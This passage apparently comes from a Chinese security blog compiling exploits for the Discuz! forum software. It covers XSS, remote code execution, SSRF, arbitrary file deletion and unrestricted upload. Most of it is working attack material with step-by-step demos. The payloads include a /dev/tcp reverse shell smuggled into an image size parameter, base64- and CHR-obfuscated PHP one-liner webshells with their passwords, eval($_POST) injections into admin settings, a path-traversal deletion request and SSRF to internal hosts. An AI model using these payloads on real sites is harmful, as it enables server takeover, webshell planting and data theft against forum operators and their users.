<h3 id="演示12：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit"><a href="#演示12：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit" class="headerlink" title="演示12：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)"></a>演示12：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)</h3><p>在发帖或回帖处设置内容为“[audio]javascript:alert(document.cookie)&#x2F;&#x2F;.wav[&#x2F;audio]”，触发XSS</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/79652e8ad632488906454b64322138ad.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/665eee7215f51a735d8959e74ed6878f.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93737">https://www.seebug.org/vuldb/ssvid-93737</a></p>
<h3 id="演示13：Discuz-trade-php-数据库’注射’-bug"><a href="#演示13：Discuz-trade-php-数据库’注射’-bug" class="headerlink" title="演示13：Discuz! trade.php 数据库’注射’ bug"></a>演示13：Discuz! trade.php 数据库’注射’ bug</h3><p>问题在trade,php中，找到类似于如下请求包，设置目录以及message参数中的payload（注意：一定是199个A）</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/919047631672b116dcfdc4d117dda1ac.png" class>

<p>之后会执行XSS。</p>
<p>参考链接：<a href="http://h2016.blog.163.com/blog/static/100863425200810413817385/">http://h2016.blog.163.com/blog/static/100863425200810413817385/</a></p>
<h2 id="命令-x2F-代码执行漏洞"><a href="#命令-x2F-代码执行漏洞" class="headerlink" title="命令&#x2F;代码执行漏洞"></a>命令&#x2F;代码执行漏洞</h2><p><strong>漏洞描述：</strong>Discuz组件中有部分功能代码未对用户的输入进行很好的过滤，导致可植入系统命令或代码到服务器执行。涉及URL如下：</p>
<p>##管理后台-站长-数据库-数据库备份-&gt;演示1</p>
<p>##文件上传-预览-&gt;演示2</p>
<p>##Discuz6.x，7.x任何帖子有表情的地方-&gt;演示3</p>
<p>##convert插件-&#x2F;config.inc.php-&gt;演示4</p>
<p><a href="http://ip/utility/convert/index.php?a=config&amp;source=d7.2_x2.0">http://ip/utility/convert/index.php?a=config&amp;source=d7.2_x2.0</a></p>
<p>##发表日志-添加网络图片处-&gt;演示5</p>
<p>##管理后台-全局-网站第三方统计代码-&gt;演示6</p>
<p>## misc.php -&gt;演示7</p>
<p>[<a href="http://ip/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb%5D(http://ip/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb)%5D=">http://ip/misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b](http://ip/misc.php?action=imme_binding&amp;response%5bresult%5d=aa:b&amp;scriptlang%5baa%5d%5bb)]=</a></p>
<p>## admin\runwizard.inc.php-&gt;演示8</p>
<p><a href="http://ip/bbs/admincp.php?action=runwizard&amp;step=3">http://ip/bbs/admincp.php?action=runwizard&amp;step=3</a></p>
<p>##管理后台-站长-Ucenter设置-设置UcenterIP处-&gt;演示9</p>
<p>##管理后台-已启用插件-接口信息-App key处-&gt;演示10</p>
<p>测试步骤与截图：</p>
<h3 id="演示1：Discuz-1-5-2-5-后台命令执行漏洞-CVE-2018-14729"><a href="#演示1：Discuz-1-5-2-5-后台命令执行漏洞-CVE-2018-14729" class="headerlink" title="演示1：Discuz! 1.5-2.5 后台命令执行漏洞(CVE-2018-14729)"></a>演示1：<a href="https://www.seebug.org/vuldb/ssvid-97510">Discuz! 1.5-2.5 后台命令执行漏洞(CVE-2018-14729)</a></h3><p>在管理后台-站长-数据库-备份中选择好要备份的表、数据和备份的方式</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0127f7d9b485fd26befaa068cc25e541.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5630b2c719e066f4a53d2f8b0f04345a.png" class>

<p>提交，使用burpsuit抓包，修改customtables[] &#x3D; pre_common_admincp_cmenu”&gt;aaa;<br>echo ‘&lt;?php phpinfo(); ?&gt;‘ &gt; phpinfo.php #</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4834856099a86c61967e688328376b56.png" class>

<p>成功</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/075d029eef73169b67670ec70ba0fa82.png" class>

<p>参考链接：</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-97510">https://www.seebug.org/vuldb/ssvid-97510</a></p>
<p><a href="https://www.anquanke.com/post/id/158270">https://www.anquanke.com/post/id/158270</a></p>
<h3 id="演示2：Discuz-X2-5-x2F-source-x2F-class-x2F-class-image-php-命令执行漏洞"><a href="#演示2：Discuz-X2-5-x2F-source-x2F-class-x2F-class-image-php-命令执行漏洞" class="headerlink" title="演示2：Discuz X2.5 &#x2F;source&#x2F;class&#x2F;class_image.php 命令执行漏洞"></a>演示2：Discuz X2.5 &#x2F;source&#x2F;class&#x2F;class_image.php 命令执行漏洞</h3><p>在发贴上传附件，上传图片附近，预览抓包修改为以下链接</p>
<p>GET&#x2F;dzx25&#x2F;forum.php?mod&#x3D;image&amp;aid&#x3D;1&amp;size&#x3D;|bash%20i%20&gt;%26%20&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888%200&gt;%261|x300&amp;key&#x3D;68b54146d9d1bfb2ebb38f44f2427454&amp;nocache&#x3D;yes&amp;type&#x3D;1&amp;ramdom&#x3D;xfie9</p>
<p>使用nc命令监听本地8888端口，成功获取到反弹的shell</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1b5db641a4ce869bce72c5e2b8b24531.png" class>

<p>参考链接：<a href="http://0day5.com/archives/2846/">http://0day5.com/archives/2846/</a></p>
<h3 id="演示3：Discuz-6-x-x2F-7-x-x2F-include-x2F-discuzcode-func-php-代码执行漏洞"><a href="#演示3：Discuz-6-x-x2F-7-x-x2F-include-x2F-discuzcode-func-php-代码执行漏洞" class="headerlink" title="演示3：Discuz 6.x&#x2F;7.x &#x2F;include&#x2F;discuzcode.func.php 代码执行漏洞"></a>演示3：Discuz 6.x&#x2F;7.x &#x2F;include&#x2F;discuzcode.func.php 代码执行漏洞</h3><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page=1">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
<p>1GLOBALS[_DCACHE][smilies][searcharray]&#x3D;&#x2F;.*&#x2F;eui;GLOBALS[_DCACHE][smilies][replacearray]&#x3D;phpinfo();</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/44db579c2e436453ee8e8ff8091ce1bf.png" class>

<p>参考链接：</p>
<p><a href="https://www.cnblogs.com/milantgh/p/4199432.html">https://www.cnblogs.com/milantgh/p/4199432.html</a></p>
<p><a href="http://sh4d0w.lofter.com/post/1cb55ec4_2d35857">http://sh4d0w.lofter.com/post/1cb55ec4_2d35857</a></p>
<p><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></p>
<p><a href="https://bugs.shuimugan.com/bug/view?bug_no=80723">https://bugs.shuimugan.com/bug/view?bug_no=80723</a></p>
<h3 id="演示4：Discuz-x3-1-convert插件代码执行漏洞"><a href="#演示4：Discuz-x3-1-convert插件代码执行漏洞" class="headerlink" title="演示4：Discuz! x3.1 convert插件代码执行漏洞"></a>演示4：Discuz! x3.1 convert插件代码执行漏洞</h3><p>在该链接下：<a href="http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&amp;source=d7.2_x2.0">http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&amp;source=d7.2_x2.0</a></p>
<p>发送如下POST请求包(设置newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));&#x2F;&#x2F;]&#x3D;aaaa)。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/45da2778bfe46d99a095dfbaf2374c4a.png" class>

<p>菜刀连接地址<a href="http://www.test.ichunqiu/utility/convert/data/config.inc.php">www.test.ichunqiu/utility/convert/data/config.inc.php</a> 密码c</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a88ca737f9449c8b2dbb711f9ab4e966.png" class>

<p>参考链接：</p>
<p><a href="https://bbs.ichunqiu.com/thread-1909-1-1.html">https://bbs.ichunqiu.com/thread-1909-1-1.html</a></p>
<p><a href="https://www.webshell.cc/4664.html">https://www.webshell.cc/4664.html</a></p>
<h3 id="演示5：Discuz-X2-5-远程代码执行漏洞"><a href="#演示5：Discuz-X2-5-远程代码执行漏洞" class="headerlink" title="演示5：Discuz! X2.5 远程代码执行漏洞"></a>演示5：Discuz! X2.5 远程代码执行漏洞</h3><p>a.注册任意账户。</p>
<p>b.登陆用户，发表blog日志（注意是日志）。</p>
<p>c.添加图片，选择网络图片，地址{${fputs(fopen(base64_decode(ZGVtby5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}}</p>
<p>d.访问日志，论坛根目录下生成demo.php，一句话密码：c。</p>
<p>参考链接：<a href="http://www.freebuf.com/vuls/329.html">http://www.freebuf.com/vuls/329.html</a></p>
<h3 id="演示6：Discuz-X3-1后台任意代码执行可拿shell"><a href="#演示6：Discuz-X3-1后台任意代码执行可拿shell" class="headerlink" title="演示6：Discuz! X3.1后台任意代码执行可拿shell"></a>演示6：Discuz! X3.1后台任意代码执行可拿shell</h3><p>全局–〉网站第三方统计代码–〉插入php代码,如插入 &lt;?php phpinfo();?&gt;</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5764594c6c1d33fa895f301cb0737c09.png" class>

<p>工具–〉更新缓存[为了保险起见，更新下系统缓存]：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10295133e9efc1552d01446c06909401.png" class>

<p>门户–&gt; HTML管理–〉设置：1）静态文件扩展名[一定要设置成htm] ：htm<br>2)专题HTML存放目录: template&#x2F;default&#x2F;portal 3)设置完，提交吧！</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/083437f5c83273d4fa237839514db0f4.png" class>

<p>门户–〉专题管理–〉创建专题：1）专题标题：xyz 2）静态化名称：portal_topic_222<br>&#x2F;&#x2F;222为自定义文件名，自己要记住 3）附加内容：选择上：站点尾部信息</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5775ab219249324b0fc04ebb5950145c.png" class>

<p>提交,回到门户–〉专题管理,把刚才创建的专题开启，如下图</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ebfc8b8b2bfc3bc65ba0e44d730d66c4.png" class>

<p>把刚才的专题，生成<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/add9c63ef2233ef0e42538763bc7ba6d.png" class></p>
<p>下面就是关键了，现在到了包含文件的时候了。 再新建一个专题：<br>1）专题标题，静态化名称，这2个随便写<br>2）模板名：这个要选择我们刚才生成的页面：.&#x2F;template&#x2F;default&#x2F;portal&#x2F;portal_topic_222.htm</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f56718e407689f99a980ec93427bb416.png" class>

<p>然后提交，就执行了&lt;?php phpinfo();?&gt;</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5caaa67f9af210b0741facc198cd1b38.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93612">https://www.seebug.org/vuldb/ssvid-93612</a></p>
<h3 id="演示7：Discuz-7-1-7-2-远程代码执行漏洞"><a href="#演示7：Discuz-7-1-7-2-远程代码执行漏洞" class="headerlink" title="演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞"></a>演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞</h3><p>直接GET，利用语句：<br><a href="http://xxxxx/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb%5D=%7B%5C$%7Bfputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))%7D%7D">http://xxxxx/misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b]={\${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}</a></p>
<p>在根目录生成C.PHP密码是C</p>
<p>参考链接：</p>
<p><a href="http://blog.51cto.com/simeon/276114">http://blog.51cto.com/simeon/276114</a></p>
<p><a href="https://www.jb51.net/hack/26337.html">https://www.jb51.net/hack/26337.html</a></p>
<h3 id="演示8：discuz-7-0-runwizard-inc-php-代码执行漏洞"><a href="#演示8：discuz-7-0-runwizard-inc-php-代码执行漏洞" class="headerlink" title="演示8：discuz 7.0 runwizard.inc.php 代码执行漏洞"></a>演示8：discuz 7.0 runwizard.inc.php 代码执行漏洞</h3><p>在该链接下：<a href="http://www.80vul.com/bbs/admincp.php?action=runwizard&amp;step=3">http://www.80vul.com/bbs/admincp.php?action=runwizard&amp;step=3</a></p>
<p>发送如下POST请求包。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d039122dcfbf095784f89ed71d9cda9d.png" class>

<p>可获取到webshell</p>
<p><a href="http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php">http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php</a></p>
<p>参考链接：<a href="http://blog.51cto.com/simeon/113131">http://blog.51cto.com/simeon/113131</a></p>
<h3 id="演示9：Discuz-X2-5最新版后台管理员权限Getshell"><a href="#演示9：Discuz-X2-5最新版后台管理员权限Getshell" class="headerlink" title="演示9：Discuz!X2.5最新版后台管理员权限Getshell"></a>演示9：Discuz!X2.5最新版后台管理员权限Getshell</h3><p>在后台–&gt;站长–&gt;Ucenter设置处设置UcenterIP为: XX\\‘);eval($_POST[a])?&gt;;&#x2F;&#x2F;<br>XX</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946befb507f2380f0296e9fb588509b8.png" class>

<p>发现管理页面代码出来了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/11ccd15874dce153f7d432b879907ee4.png" class>

<p>上菜刀：<a href="http://127.0.0.1/d25/uc_server">http://127.0.0.1/d25/uc_server</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/76a0d8d82f4ccc540d1015819f98adc7.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93655">https://www.seebug.org/vuldb/ssvid-93655</a></p>
<h3 id="演示10：Discuz后台getshell"><a href="#演示10：Discuz后台getshell" class="headerlink" title="演示10：Discuz后台getshell"></a>演示10：Discuz后台getshell</h3><p>后台找到应用，插件</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d5d71fbdc6185df240c12000c439fe3d.png" class>

<p>有一个好贷站长联盟</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/31550f4e59018e1fbba24eec7bb43e9e.png" class>

<p>安装之后有一个导入接口信息</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/74f33d0c31fa5ba3b8dbd3bfde9512b4.png" class>

<p>然后导入接口信息</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8dbe1fcf8edf3af872ec286dbb8e9f07.png" class>

<p>接口信息会放到这里</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/934bf7257cf564eb89c2776934e858ba.png" class>

<p>然后就shell了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/82c59a29c3788973678e4c8d6ec9d66f.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93624">https://www.seebug.org/vuldb/ssvid-93624</a></p>
<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p><strong>漏洞描述：</strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)<br>是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。SSRF<br>形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。可利用来探测内网信息或获取别的网站的信息或钓鱼等。涉及URL如下：</p>
<p><a href="http://ip/bbs/forum.php?mod=ajax&action=downremoteimg&message=%5Bimg=1,1%5Dhttp://xxxxxxxxxxxxxx.jpg%5B/img%5D&formhash=09cec465">http://ip/bbs/forum.php?mod=ajax&action=downremoteimg&message=[img&#x3D;1,1]http://xxxxxxxxxxxxxx.jpg[&#x2F;img]&amp;formhash&#x3D;09cec465</a></p>
<p><a href="http://ip/discuz_x3.2_sc_gbk/upload/portal.php">http://ip/discuz_x3.2_sc_gbk/upload/portal.php</a></p>
<p><strong>漏洞场景：</strong>Discuz</p>
<p><strong>漏洞地址：</strong></p>
<p><strong>漏洞级别：</strong>高危</p>
<p>测试步骤与截图：</p>
<h3 id="演示1：SSRF漏洞"><a href="#演示1：SSRF漏洞" class="headerlink" title="演示1：SSRF漏洞"></a>演示1：SSRF漏洞</h3><p>利用前提 ptid&#x3D;&#x3D;aid且两者必须存在(ptid&#x3D;&#x3D;帖子id,aid&#x3D;&#x3D;门户文章id),pid&#x3D;任意评论id。<br>即论坛门户发表过文章，准备和确认<a href="http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=view&amp;aid=1">http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=view&amp;aid=1</a><br>确认门户中存在发表过的文章,记录下可用的aid</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/c7fdbe9b01886221ed6af7f6294662f2.png" class>

<p>第一步 登陆后,请求获取modauthkey算出的一个key,用于操作对应文章:<br><a href="http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=redirect&amp;goto=findpost&amp;modthreadkey=1&amp;ptid=1&amp;pid=1">http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=redirect&amp;goto=findpost&amp;modthreadkey=1&amp;ptid=1&amp;pid=1</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3655f2c2013bcc964feef6be4b830deb.png" class>

<p>从跳转的链接取出modthreadkey的参数值:<br><a href="http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&amp;tid=1&amp;page=1&amp;modthreadkey=fce8163c9f310147f91a244a9eb9dc33%5C#pid1">http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&amp;tid=1&amp;page=1&amp;modthreadkey=fce8163c9f310147f91a244a9eb9dc33\#pid1</a></p>
<p>第二步 带上当前formhash,modarticlekey拼上第一步的modthreadkey的值,即可发请求:<br>POST:<a href="http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&amp;ac=upload&amp;aid=1&amp;catid=1&amp;op=downremotefile&amp;formhash=760dc9d6&amp;modarticlekey=fce8163c9f310147f91a244a9eb9dc33&amp;content=%5C">http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&amp;ac=upload&amp;aid=1&amp;catid=1&amp;op=downremotefile&amp;formhash=760dc9d6&amp;modarticlekey=fce8163c9f310147f91a244a9eb9dc33&amp;content=\</a><img src="http://internal.zabbix/images/general/zabbix.png\"> aa&#x3D;a</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3cb02a3ff18c3a978a9d4cef5644181e.png" class>

<p>internal.zabbix域名下的图片被下载并上传到Discuz指定的图片路径下:<br><a href="http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png">http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png</a></p>
<p><a href="http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg">http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/858590279078a58213d111945ba8800e.png" class>

<p>参考链接：<a href="http://0day5.com/archives/3920/">http://0day5.com/archives/3920/</a></p>
<h3 id="演示2：另一处SSRF漏洞（2-x，3-x）"><a href="#演示2：另一处SSRF漏洞（2-x，3-x）" class="headerlink" title="演示2：另一处SSRF漏洞（2.x，3.x）"></a>演示2：另一处SSRF漏洞（2.x，3.x）</h3><p>访问<a href="http://xxxx/bbs/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=%5Bimg=1,1%5Dhttp://xxxxxxxxxxxxxx.jpg%5B/img%5D&amp;formhash=09cec465">http://xxxx/bbs/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://xxxxxxxxxxxxxx.jpg[/img]&amp;formhash=09cec465</a></p>
<p>3.x 版本如果请求提示xss拦截要带上 formhash<br>加cookie,之前版本好像不用。SSRF成功后，域名被解析成IP。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3e680cf0afb06099addb160c719dd884.png" class>

<p>参考链接：<a href="https://bugs.shuimugan.com/bug/view?bug_no=151179">https://bugs.shuimugan.com/bug/view?bug_no=151179</a></p>
<h2 id="文件操作类漏洞"><a href="#文件操作类漏洞" class="headerlink" title="文件操作类漏洞"></a>文件操作类漏洞</h2><p><strong>漏洞描述：</strong>由于没有对文件操作类的函数做好限制，导致discuz组件存在文件上传漏洞、任意文件删除漏洞、本地文件包含漏洞。涉及URL如下：</p>
<p>#spacecp模块-&gt;演示1</p>
<p><a href="http://ip/discuz3_2/home.php?mod=spacecp&amp;ac=profile">http://ip/discuz3_2/home.php?mod=spacecp&amp;ac=profile</a></p>
<p>#管理后台-应用-插件-演示2</p>
<p>测试步骤与截图：</p>
<h3 id="演示1：Discuz-X前台任意文件删除漏洞"><a href="#演示1：Discuz-X前台任意文件删除漏洞" class="headerlink" title="演示1：Discuz!X前台任意文件删除漏洞"></a>演示1：Discuz!X前台任意文件删除漏洞</h3><p>新建importantfile.txt作为测试 进入设置-个人资料，先在页面源代码找到formhash值<br><a href="http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;ac=profile">http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;ac=profile</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b62795c5be846c3c7036f061739342ec.png" class>

<p>可以看到formhash值是b21b6577。再访问10.0.2.15:8999&#x2F;discuz3_2&#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base<br>Post数据：birthprovince&#x3D;..&#x2F;..&#x2F;..&#x2F;importantfile.txt&amp;profilesubmit&#x3D;1&amp;formhash&#x3D;b21b6577<br>如图</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3dd60f54cebf35cf2bf8a72a049f7ce4.png" class>

<p>执行后</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1e57cee32d198af9e3c6a28a5955d587.png" class>

<p>出生地被修改成要删除的文件。最后构造表单执行删除文件</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4781de6b2740e55dbd867bb9986cb732.png" class>

<p>随便上传一张图片，即可删除importantfile.txt。</p>
<p><a href="http://www.freebuf.com/vuls/149904.html">http://www.freebuf.com/vuls/149904.html</a></p>
<h3 id="演示2：Discuz-后台第三方插件上传任意后缀文件拿shell（某插件导致）"><a href="#演示2：Discuz-后台第三方插件上传任意后缀文件拿shell（某插件导致）" class="headerlink" title="演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）"></a>演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）</h3><p>问题插件出在：[MZG]点广告赚积分 1.0<br><a href="http://addon.discuz.com/?@mzg_advertise.plugin">http://addon.discuz.com/?@mzg_advertise.plugin</a> 1.先搜索 “MZG” 找到<br>点广告赚积分。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/28b9ef060ed6856c5e28f2a6d3afda50.png" class>

<p>安装插件，安装GBK还是UFT8随你系统编码选择。安装好插件后，选择 “添加广告”。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/6537467b1c4ad95ad2df969576ecb389.png" class>

<p>添加广告里面的 LOGO<br>文件上传，选本地上传，这里面未限制文件后缀，可以上传任意后缀名文件。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0040a2852de1adfd6c74535d7e88a3d2.png" class>

<p>查看添加的广告，看到了吧？</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5c32e20f2e7bc168defad3174014ff0c.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9d383b898f5ee40aaa646ae31082e72f.png" class>

<p><a href="https://www.seebug.org/vuldb/ssvid-93632">https://www.seebug.org/vuldb/ssvid-93632</a></p>
<h2 id="其他类型漏洞"><a href="#其他类型漏洞" class="headerlink" title="其他类型漏洞"></a>其他类型漏洞</h2><p><strong>漏洞描述：</strong>越权、xxe</p>
<p>Discuz! –X2&#x2F;X2.5管理权限用户修改创始人用户密码漏洞</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93622">https://www.seebug.org/vuldb/ssvid-93622</a></p>
<p>Discuz!3.2 利用UC_KEY登陆任意用户</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-89483">https://www.seebug.org/vuldb/ssvid-89483</a></p>
<p>Discuz! X3.1 逻辑错误漏洞</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-89427">https://www.seebug.org/vuldb/ssvid-89427</a></p>
<p>discuz越权回复</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93753">https://www.seebug.org/vuldb/ssvid-93753</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93609">https://www.seebug.org/vuldb/ssvid-93609</a></p>
<p>越权查看照片</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93721">https://www.seebug.org/vuldb/ssvid-93721</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93722">https://www.seebug.org/vuldb/ssvid-93722</a></p>
<p>Discuz! 多个版本HTTP host头攻击漏洞</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93728">https://www.seebug.org/vuldb/ssvid-93728</a></p>
<p>Discuz! xxe 可破坏数据库结构，导致脏数据进入</p>
<p><a href="https://bugs.shuimugan.com/bug/view?bug_no=76041">https://bugs.shuimugan.com/bug/view?bug_no=76041</a></p>
<p>Discuz附件下载权限绕过</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93615">https://www.seebug.org/vuldb/ssvid-93615</a></p>
<p>知道key的情况下对ucserver进行注射</p>
<p><a href="https://bugs.shuimugan.com/bug/view?bug_no=65534">https://bugs.shuimugan.com/bug/view?bug_no=65534</a></p>
<p><strong>漏洞场景：</strong>登陆地址中含有session类字段</p>
<p><strong>漏洞地址：</strong></p>
<p><strong>漏洞级别：</strong>高危</p>
<p>测试步骤与截图：</p>
<p>安全修复建议：</p>
<p>每次会话由服务端生成随机的，唯一的，复杂的session。</p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>CMS漏洞</category>
        <category>Discuz</category>
      </categories>
      <tags>
        <tag>-web漏洞 -CMS漏洞 -Discuz论坛</tag>
      </tags>
  </entry>
  <entry>
